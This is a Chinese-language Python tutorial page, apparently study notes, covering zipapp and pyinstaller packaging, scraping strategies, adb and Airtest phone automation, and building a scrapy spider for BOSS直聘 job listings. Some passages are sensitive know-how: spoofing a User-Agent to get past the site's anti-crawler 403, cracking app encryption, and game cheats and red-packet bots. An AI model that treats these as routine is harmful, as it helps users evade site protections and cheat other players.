# 上面命令指定将当前目录下的app子目录下的所有Python源文件打包成一个档案包,并通过-o选项指定所生成的档案包的文件名为first.pyz;-m选项指定使用app.py模块中的main函数作为程序入口。运行上面命令将会生成一个first.pyz文件。接下来可以使用python命令python first.pyz来运行first.pyz文件

</textarea><pre>
【 zipapp创建独立应用 】
通过上面介绍的方式打包得到的档案包中只有当前项目的Python文件,如果Python应用还需要使用第三方模块和包,比如需要连接MySQL的应用,那么仅打包该应用的Python程序是不够的。

为了创建能独立启动的应用,自带依赖模块和包,需要执行两步操作:
将应用依赖的模块和包下载到应用目录中。
使用zipapp将应用和依赖模块一起打包成档案包。

</pre><textarea>
# 下面在app所在目录下再创建一个dbapp子目录,该子目录将会作为本应用的目录。接下来在dbapp目录下新建一个__main__.py文件作为程序入口,这样程序在打包档案包时就不需要指定程序入口了。

# __main__.py文件代码:
from exec_select import *
# 执行query_db()函数
query_db()

# exec_select.py文件代码:
# 导入访问MySQL的模块
import mysql.connector
def query_db():
    conn = conn = mysql.connector.connect(user='root',password='32147',host='localhost',port=3306,database='python',use_unicode=True)
    c = conn.cursor()
    c.execute('select * from user_tb where user_id > %s', (2,))
    # 通过游标的description属性获取列信息
    for col in (c.description): print(col[0], end='\t')
    print('\n--------------------------------')
    # 直接使用for循环来遍历游标中的结果集
    for row in c:
        print(row)
        print(row[1] + '-->' + row[2])
    c.close()
    conn.close()

</textarea><pre>
最后按照如下步骤将dbapp子目录下的应用打包成独立应用:
1、通过命令行工具在dbapp当前所在目录执行如下命令:
python -m pip install -r requirements.txt --target dbapp

上面命令实际上就是使用pip模块来安装模块,其中python -m pip install表示要安装模块。--target选项指定将模块安装到指定目录下,此处指定将依赖模块安装到dbapp子目录下。-r选项指定要安装哪些模块,此处使用requirements.txt文件列出要安装的模块和包。-r选项支持两个值:
1、直接指定要安装的模块或包。
2、使用清单文件指定要安装的模块和包,当应用依赖的模块较多时,建议使用清单文件来列出所依赖的模块。

如果直接运行上面命令,pip模块会提示找不到requirements.txt文件,因此需要在当前目录下添加一个requirements.txt文件,并在该文件中增加如下一行。
mysql-connector-python

如果项目需要依赖多个模块,则可以在requirements.txt文件中定义多行,每行定义一个模块。

重新运行上面命令,将可以看到pip开始下载mysql-connector-python模块,下载完成后将可以在dbapp子目录下看到大量有关mysql-connector-python模块的文件。

2、如果pip在dbapp子目录下生成了.dist-info目录则建议删除该目录。

3、使用zipapp模块执行打包操作。由于本例的dbapp子目录下包含了__main__.py文件,该文件将会作为程序入口,因此打包时不需要指定-m选项。使用如下命令来打包:
python -m zipapp dbapp

与上一节所使用的命令相比,该命令没有使用-m来指定程序入口,该程序将会使用档案包中的__main__.py文件作为程序入口。运行上面命令,将会得到一个大约为18MB的档案包。因为该档案包自包含了mysql-connector-python模块,所以比较大。

在创建了独立应用之后,只要目标机器上安装了合适版本的Python解释器,即可运行该独立应用。可以先使用如下命令卸载在Python目录下安装的mysql-connector-python模块:
pip uninstall mysql-connector-python

此时在本机的Python目录下不再包含mysql-connector-python模块,但dbapp.pyz程序依然可以正常运行,因为它自包含了mysql-connector-python模块

</pre>

<h4>pyinstaller生成可执行程序</h4><pre>
pip install pyinstaller

在创建了独立应用即包含该应用的依赖包之后,还可以使用pyinstaller将Python程序生成可直接运行的程序,这个程序就可以被分发到对应的Windows或Mac OS X平台上运行

在pyinstaller模块安装成功之后,在Python的安装目录下的Scripts(D:\Python\Python36\Scripts)目录下会增加一个pyinstaller.exe程序,接下来就可以使用该工具将Python程序生成EXE程序了。

不管这个Python应用是单文件的应用还是多文件的应用,只要在使用pyinstaller命令时编译作为程序入口的Python程序即可。
pyinstaller工具是跨平台的,可以在Windows和Mac OS X平台上运行,不同的平台上使用pyinstaller工具的方法和支持的选项是一样的

pyinstaller常用选项可通过pyinstaller -h来查看
-F,-onefile 产生单个的可执行文件
-D,--onedir 产生一个目录(包含多个文件)作为可执行程序
-a,--ascii  不包含Unicode字符集支持
-d,--debug  产生debug版本的可执行文件
-w,--windowed,--noconsolc   指定程序运行时不显示命令行窗口,仅对Windows有效
-c,--nowindowed,--console   指定使用命令行窗口运行程序,仅对Windows有效
-o DIR,--out=DIR    指spe文件的生成目录。如果没有指定则默认使用当前目录来生spe文件
-p DIR,--path=DIR   设Pytho导入模块的路径(和设PYTHONPAT环境变量的作用相似)。也可使用路径分隔符(Window使用分号,Linu使用冒号)来分隔多个路径
-n NAME,--name=NAME 指定项目(产生的spec)名字。如果省略该选项,那么第一个脚本的主文件名将作为spec的名字

pyinstaller -F app.py
使用app.py作为入口文件,命令执行完后在app目录下生成的build、dist目录和app.spec文件,并在dist目录下生成一个app.exe可执行程序文件
-F选项指定生成单独的EXE文件,因此在dist目录下生成了一个单独的大约为6MB的app.exe文件(在Mac OS X平台上生成的文件就叫app,没有后缀)
由于该程序没有图形用户界面,因此如果试图通过双击来运行该程序,则只能看到程序窗口一闪就消失了,这样将无法看到该程序的输出结果。

pyinstaller -D app.py
与-F选项对应的是-D选项(默认选项),该选项指定生成一个目录(包含多个文件)来作为程序,当生成完成后将会在app目录下多了一个dist目录,并在该目录下看到有一个app子目录,在该子目录下包含了大量.dll文件和.pyz文件,它们都是app.exe程序的支撑文件。在命令行窗口中运行该app.exe程序,同样可以看到与前一个app.exe程序相同的输出结果。

</pre>创建一个可以访问MySQL数据库的应用程序图形用户界面<textarea>
# 导入访问MySQL的模块查询数据
import MySQLdb
def query_db():
    conn = MySQLdb.connect(user='admin',host='localhost',port=3306,db='python')
    c = conn.cursor()
    c.execute('select * from user_tb where id >= %s', (1,))
    description = c.description  # 通过游标的description属性获取列信息
    rows = c.fetchall()  # 使用fetchall获取游标中的所有结果集
    c.close()
    conn.close()
    return description, rows

# 创建图形用户界面来显示查询结果
from tkinter import *
def main():
    description, rows = query_db()
    win = Tk()
    win.title('数据库查询')
    # 通过description获取列信息
    for i, col in enumerate(description):
        lb = Button(win, text=col[0], padx=50, pady=6)
        lb.grid(row=0, column=i)
    # 直接使用for循环查询得到的结果集
    for i, row in enumerate(rows):
        for j in range(len(row)):
            en = Label(win, text=row[j])
            en.grid(row=i+1, column=j)
    win.mainloop()
if __name__ == '__main__':
    main()

# Pyinstaller -F -w main.py

</textarea>
</div>

<div id="scrapy">
<h3>scrapy爬虫框架</h3><pre>
爬取的目标绝大多数情况下要么是网页,要么是App
网页分为服务端渲染和客户端渲染两种类别,对于App针对接口的形式进行了四种类别的划分——普通接口、加密参数接口、加密内容接口、非常规协议接口
服务端渲染即页面的结果是由服务器渲染后返回的,有效信息包含在请求的HTML页面里面,比如猫眼电影这个站点。客户端渲染的意思就是页面的主要内容由js渲染而成,真实的数据是通过Ajax接口等形式获取的,比如淘宝、微博手机版等站点
服务端渲染的情况就比较简单,用一些基本的HTTP请求库就可以实现爬取,如Python内置的原生底层库urllib、libcurl的python实现pycurl、支持http2新特征的hyper、应用最广泛的requests、基于urllib3和PyQuery封装的grab等框架,配合re模块

对于客户端渲染又划分了四个处理方法：
1、寻找Ajax接口,此种情形可以直接使用Chrome/Firefox的开发者工具直接查看Ajax具体的请求方式、参数等内容,然后用HTTP请求库模拟即可,还可以通过设置代理抓包来查看接口如Fiddler/Charles。
2、模拟浏览器执行,此种情形适用于网页接口和逻辑较为复杂的情况,可以直接以可见即可爬的方式进行爬取,如可以使用Selenium、Splinter、Spynner、pyppeteer、PhantomJS、Splash、requests-html等来实现。
3、直接提取js数据,此种情形适用于真实数据没有经过Ajax接口获取,而是直接包含在HTML结果的某个变量中,直接使用正则表达式将其提取即可。
4、模拟执行js,某些情况下直接模拟浏览器执行效率会偏低,如果把js的某些执行和加密逻辑摸清楚了,可以直接执行相关的js来完成逻辑处理和接口请求,比如使用Selenium(使用execute_script方法执行js代码,return可获取执行结果)、PyExecJS(支持nodejs,PyV8,PhantomJS等引擎)、PyV8、js2py(js代码转python代码执行)等库来完成即可。

对于App的爬取分了四个处理情况：
1、对于普通无加密接口,这种直接抓包拿到接口的具体请求形式就好了,可用的抓包工具有Charles、Fiddler、mitmproxy。
2、对于加密参数的接口,一种方法可以实时处理例如Fiddler、mitmdump、Xposed等,另一种方法是将加密逻辑破解直接模拟构造即可,可能需要一些反编译的技巧。
3、对于加密内容的接口,即接口返回结果完全看不懂是什么东西,可以使用可见即可爬的工具Appium,也可以使用Xposed来hook获取渲染结果,也可以通过反编译和改写手机底层来实现破解。
4、对于非常规协议,可以使用Wireshark来抓取所有协议的包,或者使用Tcpdump来进行TCP数据包截获。

解析
对于HTML类型的页面来说,常用的解析方法：正则re库、XPath(常用库有lxml、Scrapy Selector等)、CSS Selector(常用库有pyquery、cssselect等),另外对于某些接口常见的可能就是JSON、XML(使用xml2dict)类型,使用对应的库进行处理即可。

智能解析
这些规则和解析方法其实写起来是很繁琐的,如果要爬上万个网站,如果每个网站都去写对应的规则就太累了,所以智能解析便是一个需求,如果能提供一个页面,算法可以自动来提取页面的标题、正文、日期等内容,同时把无用的信息给刨除,例如Safari中自带的阅读模式自动解析,如果能够容忍一定的错误率,可以使用智能解析来大大节省时间。

对于智能解析下面分为四个方法进行了划分：
1、readability算法,这个算法定义了不同区块的不同标注集合,通过权重计算来得到最可能的区块位置。
2、疏密度判断,计算单位个数区块内的平均文本内容长度,根据疏密程度来大致区分。
3、Scrapyly自学习是Scrapy开发的组件,指定⻚面和提取结果样例,其可自学习提取规则,提取其他同类⻚面。
7、深度学习,使⽤深度学习来对解析位置进⾏有监督学习,需要⼤量标注数据。

【 ADB环境搭建、adb命令 安卓调试 python通过adb操作手机 】
adb全称Android Debug Bridge安卓平台调试桥,就是起到调试桥的作用,是连接Android手机与PC端的桥梁,是客户端测试常用的辅助工具。借助adb工具可以管理设备或手机模拟器的状态。还可以进行很多终端操作,如安装软件、卸载软件、查看设备软硬件参数、系统升级、运行shell命令等。adb就是Android终端(如手机/机顶盒)与PC端的桥梁,可以让用户在电脑上对手机进行全面的操作、记录终端操作日志。

首先需要开启开发者模式才可以使用adb操作模拟器或手机,手机通过USB线连接电脑,在cmd运行窗口输入命令："adb devices",显示已连接的设备信息
adb shell screencap -p  *.png  //获取截屏
adb pull sdcard/*.png F:\* //将截屏发送到电脑目录下,利用cv2(pip install opencv-python)来对图片进行对比
adb shell input tap   //鼠标点击
adb shell input命令是模拟手动操作用的最频繁的一个命令,主要是模拟输入文本、按键事件、点击、滑动等操作,在用python封装的时候会重点用

适配多部手机,让一台PC可以同时adb操作多部手机
对于手机上的一些比较难以通过抓包获取的数据可以像selenium那样轻松获取
手机自动抢红包
自动跳一跳小游戏,手机游戏外挂

python下的adb命令执行则是使用os来对命令行进行操作
os.system(*)  //执行命令行指令

【 Airtest工具 】
Airtest工具主要用来做游戏自动化的,通过截图的方式用来解决游戏自动化测试的难题
Airtest是网易出品的一款基于图像识别和poco控件识别的一款适合于游戏和App的UI自动化测试框架工具,可以基于图像识别来完成自动化测试,可以基于poco控件来完成自动化测试
Airtest的框架是网易团队开发的一个图像识别框架,这个框架的祖宗就是一种新颖的图形脚本语言Sikuli。
Sikuli这个框架的原理:计算机用户不需要一行行的去写代码,而是用屏幕截屏的方式,用截出来的图形摆列组合成神器的程序,这是Airtest的一部分
Airtest也基于poco这个U控件搜索框架,这个框架也是网易自家的跨平台U测试框架,原理类似于appium,通过控件的名称,id之类的来定位目标控件,然后调用函数方法,例如click(),swip()之类的方法来对目标控件进行点击或者是操作

Airtest更多的用作自动化测试
自动化测试就是把繁杂的人工测试用例利用自动化测试工具编写成代码,让机器代替人工自动跑用例的过程。实际上就是把以人为驱动的测试行为转化为机器执行的一种过程。
意义:节省人力、物力、时间、硬件资源等,提升测试效率,特别对于繁琐重复的测试用例,可以使测试人员更专注于新的测试模块的建立和开发,从而提高测试覆盖率。

Airtest上手难易度低,高效方便,结合Python脚本,可以完成一些自动化的操作,也可以快速开发出一款App端的爬虫。

安装
如果只是简单的一些操作,可以使用官网提供的 AirtestIDE,通过简单的拖拽、按压、点击就能完成脚本录制和回放操作
当想完成一些复杂的操作,就需要在Python虚拟环境下pip3 install pocoui安装pocoui依赖库,然后借助Pycharm编写Python脚本来完成。
官网下载：https://airtest.netease.com/changelog.html,解压即用

配置手机
1. 打开 AirtestIDE
2. 将手机打开开发者模式
3. USB链接手机
4. 在右上角点击connect
5. 出现界面即可

基于Airtest实现python自动抢红包

有线连接和无线连接
利用Airtest驱动手机完成自动化操作,有两种方式：有线连接、无线连接。

有线连接：手机通过数据线连接PC,确保使用adb devices命令能找到设备,然后通过下面的Python代码即可以完成连接操作。
self.poco = AndroidUiautomationPoco(screenshot_each_action=False)
auto_setup(__file__)

无线连接：保证手机和PC在同一个网段,使用adb启动手机端的adb端口,然后使用下面的Python代码完成连接操作。
adb tcpip 6666  # 通过adb命令开启手机端的adb端口
device = connect_device('android:///192.168.1.166:6666?cap_method=javacap&touch_method=adb') # 通过Python,无线连接PC和手机
poco = AndroidUiautomationPoco(device_1, screenshot_each_action=False)
auto_setup(__file__)

常用操作
只需要通过Android SDK中的Monitor工具识别到元素ID或文本,然后借助Poco依赖库完成常见的操作：点击、长按、滑动

# 点击1
poco(元素ID).click()
# 点击2
poco(text=u'元素文本内容').click()
# 长按
poco(元素ID或者元素文本).long_click(长按的时长)
# 滑动到下一页
poco.swipe([起始坐标x轴, 起始坐标y轴], [终点坐标x轴, 终点坐标y轴], duration=滑动时长)
poco.swipe([0.5, 0.8], [0.5, 0.3], duration=1)
# 滑动到上一页
poco.swipe([0.5, 0.3], [0.5, 0.8], duration=1)

pocoui已经封装了页面的常用操作,包含：回到桌面、模拟手机返回键、锁屏键、截屏、卸载、打开应用等操作。
# 打开应用
def start_app(package, activity=None):
# 停止应用
def stop_app(package):
# 截屏
def snapshot(filename=None, msg=""):
# 回到桌面
def home():
# 模拟按键操作
# 模拟页面返回操作
keyevent('BACK')

异常处理
由于Airtest是一款UI测试框架,对可见的元素能通过元素ID或文本内容拿到元素,处理列表的时候,滑动的时候经常会导致元素异常,这里要做好异常处理。

# 处理列表元素
try:
 self.__handle_good_list()
except:
 pass

元素获取不到
借助Android SDK中的Monitor查看元素属性,会发现有些元素没有ID和文本,这时候可以查看UI树的结构,找到一个可以确定的元素,通过父子关系拿到这个元素。

点击无效
有时通过pocoui拿到元素对象,但是点击没有效果,这种情况可以通过反复点击直达某个元素出现来解决这个问题。

# 点击搜索按钮
while True:
 # 等待检索结果列表出现
 if not self.poco(元素ID).exists():
 # 再次点击
 perform_click(self.poco(元素ID, text='搜索'))
 else:
 break

【 网络爬虫的核心工作 】
1、向URL发送请求,获取服务器响应内容,这是所有网络爬虫都需要做的通用工作,一般来说通用工作应该由爬虫框架来实现,这样可以提供更稳定的性能,开发效率更高。
2、使用某种技术如正则表达式、XPath等提取页面中感兴趣的信息。这个核心工作不是通用的,每个项目感兴趣的信息都可能有所不同,但使用正则表达式提取信息是非常低效的,原因是正则表达式的设计初衷主要是处理文本信息,而HTML文档不仅是文本文档,而且是结构化文档,因此使用正则表达式来处理HTML文档并不合适。使用XPath提取信息的效率要高得多。
3、高效地识别响应页面中的链接信息,顺着这些链接递归执行第1、2、3步。使用正则表达式可以实现这个核心工作,但效率太低,使用XPath会更高效。
4、使用多线程有效地管理网络通信交互:这个核心工作是通用的,应该由框架来完成。

【 分布式爬虫 】
开发一个网站想要给别人访问就需要把网站部署到服务器,当网站用户增多的时候一个服务器就不满足需求了于是就会把网站部署到多个服务器上,这种情况通常叫集群,就是把整个网站的所有功能都同时部署到不同的服务器上,一般会使用ngnix作负载均衡
不过有些功能并发量并不是很高比如一些后台的管理,所以就有人想要不然把这个网站的功能都拆分出来,让每一个模块只负责具体的功能,比如登录注册模块,内容管理模块、搜索模块、缓存服务模块等
然后在部署的时候把一些并发量大的模块部署到多个服务器就行了,耦合度大大的降低了,并发量小的模块也不会浪费那么多资源了
当然这时需要让模块与模块之间产生联系,也就是调度好它们,一般会用到消息队列,这就是所谓的分布式

对于一些数据不大的数据爬虫一般是直接在电脑运行了,也就是所谓的单机爬虫
而分布式爬虫说白了就是把爬虫的关键功能以刚说的分布式形式部署到多台机器上然后一起盘(爬)它

单主机爬虫架构
本机维护一个爬虫队列,scheduler进行调度

那么如何将爬虫之间联系起来呢,多台主机协作的关键是共享爬虫队列,可以使用Redis的消息队列进行调度(schedule),redis是一个读写速度快的缓存数据库,还提供了类似Python 的list、set等数据结构,而且它还可以将内存的数据写到磁盘性能很好

在scrapy框架里面就有一个scrapy-redis专门用它来调度爬虫的,它可以将请求的url放到redis的消息队列里面,然后用spider模块将数据给结构化抽出来放到redis数据库里面去,当然分布式爬虫有时候还会结合数据库集群爬取数据

scrapy-redis是一个基于redis数据库的scrapy组件,它提供了四种组件,通过它,可以快速实现简单分布式爬虫程序。

要保证多台机器共用一个queue队列和set集合,在scrapy框架中,是需要结合scrapy_redis完成的。分布式爬虫可以让所有机器上的爬虫程序,从同一个queue队列中获取request请求,并且每个机器取出request,请求的对象是不一样的,直到所有的request被请求完毕

要实现分布式爬虫,首先要配置redis服务器主从：
配置主从的目的：
1.达到一个备份的功能,一旦master出现崩溃而数据库中还有数据的话,可以将其中的一个slave重新设置为主服务器,从而恢复redis的正常运行。
2.一个redis服务器负责读写,性能较低,通过主从来减轻一个redis的压力

scrapy-redis组件
1、Scheduler(调度)
Scrapy改造了python本来的collection.deque(双向队列)形成了自己Scrapy queue,而scrapy-redis的解决是把这个Scrapy queue换成redis数据库,从同一个redis-server存放要爬取的request,便能让多个spider去同一个数据库里读取。Scheduler负责对新的request进行入列操作(加入Scrapy queue),取出下一个要爬取的request(从Scrapy queue中取出)等操作。

2、Duplication Filter(去重)
Scrapy中用集合实现这个request去重功能,Scrapy中把已经发送的request指纹放入到一个集合中,把下一个request的指纹拿到集合中比对,如果该指纹存在于集合中,说明这个request发送过了,如果没有则继续操作。

3、Item Pipline(管道)
引擎将Spider返回的爬取到的Item给Item Pipeline,scrapy-redis的Item Pipeline将爬取到的Item存⼊redis的items queue。

4、Base Spider(爬虫)
不再使用scrapy原有的Spider类,重写的RedisSpider继承了Spider和RedisMixin这两个类,RedisMixin是用来从redis读取url的类。

Scrapy-Redis工作机制
1、首先Slaver端从Master端拿任务(Request、url)进行数据抓取,Slaver抓取数据的同时,产生新任务的Request便提交给 Master 处理;
2、Master端只有一个Redis数据库,负责将未处理的Request去重和任务分配,将处理后的Request加入待爬队列,并且存储爬取的数据。

</pre>

<h4>scrapy</h4><pre>
scrapy是Python领域专业高效的爬虫开发框架,已经完成爬虫程序的大部分通用工具,因此scrapy开发爬虫项目既简单又方便
scrapy使用专业的Twisted包(基于事件驱动的网络引擎包)高效地处理网络通信,使用lxml(专业的XML处理包)、cssselect高效地提取HTML页面的有效信息,同时它也提供了有效的线程管理。
网络爬虫的核心工作,scrapy全部提供了实现,只要使用XPath或css选择器定义感兴趣的信息即可。

【 scrapy安装 】
pip install scrapy

自动安装的scrapy依赖的第三方包:
pyOpenSSL:Python用于支持SSL(Security Socket Layer)的包。
cryptography:Python用于加密的库。
CFFI:Python用于调用C的接口库。
zope.interface:为Python缺少接口而提供扩展的库。
lxml:一个处理XML、HTML文档的库,比Python内置的xml模块更好用。
cssselect:Python用于处理CSS选择器的扩展包。
Twisted:为Python提供的基于事件驱动的网络引擎包。
......

pip在自动下载、安装Twisted时会提示以下错误:
error:Microsoft Visual C++ 14.0 is required. Get it with "Microsoft Visual C++ Build Tools":http://landinghub.visualstudio.com/visual-cpp-build-tools
解决:先下载安装Microsoft Visual C++ Build Tools工具,然后才能安装Twisted。但没必须要为了安装一个小小的Twisted包就安装一个庞大的Microsoft Visual C++ Build Tools,,提示上面的错误只是因为pip自动下载的Twisted安装包有一些缺陷,因此可以先下载Twisted安装包。登录www.lfd.uci.edu/~gohlke/pythonlibs/,在该页面中间查找"Twisted"项目,当前Twisted的最新版是18.9.0,Twisted为2.7、3.5、3.6、3.7等不同版本的Python提供了对应的安装包。Python3.6应该下载Twisted的Python3.6版本,其中文件名带win32的是32位版本,而带win_amd64的则是64位版本,此处还需要根据操作系统的位数选择对应的版本。
在下载了合适的Twisted安装包后会得到一个Twisted-18.9.0-cp36-cp36m-win_amd64.whl文件,该文件就是Twisted安装包。
运行pip install Twisted-18.9.0-cp36-cp36m-win_amd64.whl命令来安装Twisted包
在安装过程中会自动检查,如有必要会自动下载并安装Twisted所依赖的第三方包,如zope.interface、Automat、incremental等。
在安装完成后会提示如下安装成功的信息Successfully installed Twisted-18.9.0

在成功安装Twisted包之后再次执行pip install scrapy命令即可成功安装scrapy。在安装成功后会提示Successfully installed scrapy-1.6.1
在成功安装scrapy之后可以通过pydoc来查看scrapy的文档。在命令行窗口中输入命令python -m pydoc -p 8899,打开浏览器查看http://localhost:8899/页面,可以在Python安装目录的lib\site-packages下看到scrapy的文档

scrapy是scrapy框架提供的命令,scrapy提供常用的子命令: startproject(创建项目)、fetch(从指定URL获取响应)、genspider(生成蜘蛛)、shell(启动交互式控制台)、version(查看scrapy版本)等,可以直接输入scrapy查看该命令所支持的全部子命令。

【 scrapy项目创建 】
创建名为ZhipinSpider的scrapy项目:
scrapy startproject ZhipinSpider

</pre>查看ZhipinSpider项目,可以看到如下文件结构和scrapy项目中各组件的作用<textarea>
ZhipinSpider
  ├─ scrapy.cfg - 项目的总配置文件,通常无须修改
  └──ZhipinSpider - 项目的Python模块,程序将从此处导入Python代码
      ├─ setting.py - 项目的配置文件,在该文件中进行项目相关配置
      ├─ items.py - 用于定义项目用到的Item类。Item类就是一个DTO(数据传输对象),通常就是定义N个属性,该类需要由开发者来定义
      ├─ pipelines.py - 项目的管道文件,负责处理爬取到的信息。该文件需要由开发者编写
      ├─ middlewares.py - 定义Downloader Middlewares(下载器中间件)和Spider Middlewares(蜘蛛中间件)的实现
      ├─ __init__.py
      ├─ spiders - 在该目录下存放项目所需的蜘蛛spider文件,蜘蛛负责抓取项目感兴趣的信息
      │    ├─  __init__.py
      │    └─ __pycache__
      └─ __pycache__

</textarea><pre>
Scrapy主要包括了以下组件:
引擎(Scrapy)
用来处理整个系统的数据流处理,触发事务(框架核心)

调度器(Scheduler)
该组件由scrapy框架实现,它负责调用下载中间件从网络上下载资源。
用来接受引擎发过来的请求,压入队列中,并在引擎再次请求的时候返回,可以想像成一个URL(抓取网页的网址或者说是链接)的优先队列, 由它来决定下一个要抓取的网址是什么,同时去除重复的网址

下载器(Downloader)
该组件由scrapy框架实现,它负责从网络上下载数据,下载得到的数据会由scrapy引擎自动交给蜘蛛。
用于下载网页内容, 并将网页内容返回给蜘蛛(Scrapy下载器是建立在twisted这个高效的异步模型上的)

爬虫(Spiders)
该组件由开发者实现,蜘蛛负责从下载数据中提取有效信息。蜘蛛提取到的信息会由scrapy引擎以Item对象的形式转交给Pipeline。
爬虫是主要干活的, 用于从特定的网页中提取自己需要的信息, 即所谓的实体(Item)。用户也可以从中提取出链接,让Scrapy继续抓取下一个页面

项目管道(Pipeline)
该组件由开发者实现,该组件接收到Item对象(包含蜘蛛提取的信息)后,可以将这些信息写入文件或数据库中
负责处理爬虫从网页中抽取的实体,主要的功能是持久化实体、验证实体的有效性、清除不需要的信息。当页面被爬虫解析后,将被发送到项目管道,并经过几个特定的次序处理数据。

下载器中间件(Downloader Middlewares)
位于Scrapy引擎和下载器之间的框架,主要是处理Scrapy引擎与下载器之间的请求及响应。

爬虫中间件(Spider Middlewares)
介于Scrapy引擎和爬虫之间的框架,主要工作是处理蜘蛛的响应输入和请求输出。

调度中间件(Scheduler Middewares)
介于Scrapy引擎和调度之间的中间件,从Scrapy引擎发送到调度的请求和响应。

所以使用scrapy开发网络爬虫主要就是开发两个组件:蜘蛛和Pipeline

Scrapy运行流程大概如下:
1、引擎从调度器中取出一个链接(URL)用于接下来的抓取
2、引擎把URL封装成一个请求(Request)传给下载器
3、下载器把资源下载下来,并封装成应答包(Response)
4、爬虫解析Response
5、解析出的是实体(Item)则交给实体管道进行进一步的处理
6、解析出的是链接(URL)则把URL交给调度器等待抓取

基本命令
1. scrapy startproject 项目名称
在当前目录中创建一个项目文件(类似于Django)

2. scrapy genspider [-t template] < name> < domain>
创建爬虫应用
如:
scrapy gensipider -t basic oldboy oldboy.com
scrapy gensipider -t xmlfeed autohome autohome.com.cn
PS:
查看所有命令:scrapy gensipider -l
查看模板命令:scrapy gensipider -d 模板名称

3. scrapy list
展示爬虫应用列表

4. scrapy crawl 爬虫应用名称 --nolog(无运行日志显示)
运行单独爬虫应用

【 scrapy shell调试工具 】
爬取BOSS直聘网上广州地区的热门职位进行分析https://www.zhipin.com/c101280100/h_101280100/

使用scrapy提供的shell调试工具来抓取该页面中的信息,使用如下命令来开启shell调试:
scrapy shell https://www.zhipin.com/c101280100/h_101280100/

运行上面命令将会看到scrapy并未抓取到页面数据,而是返回403错误,这表明目标网站开启了"防爬虫",不允许使用scrapy"爬取"数据,为了解决这个问题需要让scrapy伪装成浏览器,发送请求时设置User-Agent头的值为真实浏览器Firefox
scrapy shell -s USER_AGENT='Mozilla/5.0' https://www.zhipin.com/c101280100/h_101280100

接下来就可以使用XPath或css选择器来提取感兴趣的信息,XPath比css选择器的匹配能力更强

//div匹配页面中任意位置的div元素
//div/span匹配页面中任意位置处的div元素内的span子元素。
//div[@class]匹配页面中任意位置处、有class属性的div元素
//div/span[1]匹配页面中任意位置处的div元素内的第一个span子元素
//div/span[last()]匹配页面中任意位置处的div元素内的最后一个span子元素
//div/span[last()-1]匹配页面中任意位置处的div元素内的倒数第二个span子元素

在scrapy的shell控制台调用response的xpath()方法来获取XPath匹配的节点,extract()方法用于提取节点的内容,执行如下命令:
>>> response.xpath('//div[@class="job-primary"]/div/h3/a/div/text()').extract()

【 scrapy爬虫项目开发过程 】
通过前面的scrapy shell调试已经演示了使用XPath从HTML文档中提取信息的方法,只要将这些调试的测试代码放在Spider中即可实现真正的scrapy爬虫

</pre>基于scrapy项目开发爬虫大致步骤<textarea>
'''
1、定义Item类,该类仅用于定义项目需要爬取的N个属性,比如该项目需爬取工作名称、工资、招聘公司等信息则可在items.py中增加如下类定义
为所有需要爬取的信息定义对应的属性,每个属性都是一个scrapy.Field对象
该Item类只是一个作为数据传输对象(DTO)的类,因此定义该类非常简单
'''
import scrapy
class ZhipinspiderItem(scrapy.Item):
    title = scrapy.Field()        # 工作名称
    salary = scrapy.Field()       # 工资
    company = scrapy.Field()      # 招聘公司
    url = scrapy.Field()          # 工作详细链接
    work_addr = scrapy.Field()    # 工作地点
    industry = scrapy.Field()     # 行业
    company_size = scrapy.Field() # 公司规模
    recruiter = scrapy.Field()    # 招聘人
    publish_date = scrapy.Field() # 发布时间

'''
2、编写Spider类,应将该Spider类文件放在spiders目录下,这一步是爬虫开发的关键,需使用XPath或CSS选择器来提取HTML页面中的信息。
scrapy为创建Spider提供了scrapy genspider命令,该命令的语法格式如下:
scrapy genspider [options] < name> < domain>

在命令行窗口中进入ZhipinSpider目录下,然后执行如下命令即可创建一个Spider:
scrapy genspider job_position "zhipin.com"
运行上面命令即可在ZhipinSpider项目的ZhipinSpider/spider目录下找到job_position.py文件即Spider类的模板,打开该文件可以看到如下内容:
'''
import scrapy
class JobPositionSpider(scrapy.Spider):
    name = 'job_position'                                             # 定义该Spider的名字
    allowed_domains = ['zhipin.com']                                  # 定义该Spider允许爬取的域名
    start_urls = ['https://www.zhipin.com/c101280100/h_101280100/']   # 定义该Spider爬取的首页列表

    # 该方法负责提取response所包含的信息
    def parse(self, response):
        pass

'''
Spider需要继承scrapy.Spider,并重写它的parse(self,response)方法。从该类来看,看不到发送请求、获取响应的代码,这也正是scrapy的魅力所在,即只要把所有需要爬取的页面URL定义在start_urls列表中,scrapy的下载中间件就会负责从网络上下载数据,并将所有这些页面的数据传给parse(self,response)方法的response参数。

如果在Windows上使用genspider命令来生成爬虫类则容易引发SyntaxError:(unicode error)'utf-8' codec can't decode byte 0xb9 in position 0: invalid start byte错误,这是由于Windows采用了GBK字符集。因此需要手动将该Spider类保存为UTF-8字符集。

因此开发者主要就是做两件事情:
1、将要爬取的各页面URL定义在start_urls列表中。
2、在parse(self,response)方法中通过XPath或CSS选择器提取项目感兴趣的信息。

下面将job_position.py文件改为如下形式:
'''
import scrapy
from ZhipinSpider.items import ZhipinspiderItem
class JobPositionSpider(scrapy.Spider):
    name = 'job_position'                                             # 定义该Spider的名字
    allowed_domains = ['zhipin.com']                                  # 定义该Spider允许爬取的域名
    start_urls = ['https://www.zhipin.com/c101280100/h_101280100/']   # 定义该Spider爬取的首页列表

    # 该方法负责提取response所包含的信息,response代表下载器从start_urls中每个URL下载得到的响应
    def parse(self, response):
        # 遍历页面上所有//div[@class="job-primary"]节点,每个节点都包含一份招聘信息,为每个节点都建立一个ZhipinspiderItem对象,并从该节点中提取项目感兴趣的信息存入ZhipinspiderItem对象中
        for job_primary in response.xpath('//div[@class="job-primary"]'):
            item = ZhipinspiderItem()

            # 匹配//div[@class="job-primary"]节点下/div[@class="info-primary"]节点,也就是匹配到包含工作信息的div元素
            info_primary = job_primary.xpath('./div[@class="info-primary"]')
            item['title'] = info_primary.xpath('./h3/a/div[@class="job-title"]/text()').extract_first()
            item['salary'] = info_primary.xpath('./h3/a/span[@class="red"]/text()').extract_first()
            item['work_addr'] = info_primary.xpath('./p/text()').extract_first()
            item['url'] = info_primary.xpath('./h3/a/@href').extract_first()

            # 匹配//div[@class="job-primary"]节点下./div[@class="info-company"]节点下的/div[@class="company-text"]的节点,也就是匹配到包含公司信息的div元素
            company_text = job_primary.xpath('./div[@class="info-company"]/div[@class="company-text"]')
            item['company'] = company_text.xpath('./h3/a/text()').extract_first()
            company_info = company_text.xpath('./p/text()').extract()

            if company_info and len(company_info) > 0:
                item['industry'] = company_info[0]
            if company_info and len(company_info) > 2:
                item['company_size'] = company_info[2]

